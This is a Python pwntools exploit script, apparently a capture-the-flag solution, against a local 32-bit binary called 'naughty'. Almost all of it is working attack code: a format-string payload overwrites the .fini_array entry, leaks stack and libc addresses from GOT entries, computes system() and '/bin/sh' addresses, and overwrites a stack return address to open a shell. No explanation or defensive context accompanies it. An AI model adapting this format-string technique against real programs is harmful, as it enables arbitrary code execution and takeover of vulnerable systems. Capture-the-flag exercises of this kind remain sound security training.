from pwn import *

r = process('./naughty')
raw_input('debug')

finit_add = 0x8049bc4 
fgets_got = 0x8049cb8
puts_got = 0x8049cc0
system_offset = 0x03adb0
binsh_offset = 0x15bb0b
puts_offset = 0x05fcb0
offset = 0x8c

def exploitFS(s, start, index, strformat):
	str1 = ""
	buf = ""
	for i in s[::-1]:
		if i == 'x':
			break
		str1 += i
	if len(str1)%2 != 0:
		str1 += '0'
	l = int(len(str1) /2)
	for i in range(l):
		tmp = str1[i*2 +1] + str1[i*2]
		tmp2 = int(tmp, 16)
		if tmp2 < start:
			offset = tmp2 + 256  - start
			start = tmp2
		else:
			offset = tmp2 -start
			start = tmp2
		buf += '%' + str(offset) + 'x%' + str(index + i) + '$' + strformat
		
	return buf, start

buf = p32(finit_add) + p32(finit_add + 0x1) + p32(finit_add + 0x2) + p32(finit_add + 0x3)
buf += p32(puts_got) + p32(fgets_got)
tmp = ''
start = 24
tmp, start = exploitFS(hex(0x048536), start, 7, 'hhn')
tmp += '%' + str(0x104) + 'x%10$hhn'
buf += tmp
buf += 'linh%31$p%11$s%12$s' 
r.sendlineafter('What is your name?', buf)
r.recvuntil('linh')
res = r.recv(10)
leak = int(res, 16) - offset
log.info('stack = %#x' %leak)

res = r.recv(4)
puts_add = u32(res)
log.info('puts_add = %#x' %puts_add)

r.recv(4)
res = r.recv(4)
fgets_add = u32(res)
log.info('fgets_add = %#x' %fgets_add)

libc_base = puts_add - puts_offset
system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset
log.info('binsh %#x' %binsh_add)

buf = p32(leak) + p32(leak + 0x1) + p32(leak + 0x2) + p32(leak + 0x3)
buf += p32(leak + 0x8) + p32(leak + 0x9) + p32(leak + 0xa) + p32(leak + 0xb)
tmp = ''
start = 32
tmp, start = exploitFS(hex(system_add), start, 7, 'hhn')
buf += tmp
tmp, start = exploitFS(hex(binsh_add), start, 11, 'hhn')
buf += tmp
r.sendlineafter('What is your name?', buf)


r.interactive()
r.close()

# FLAG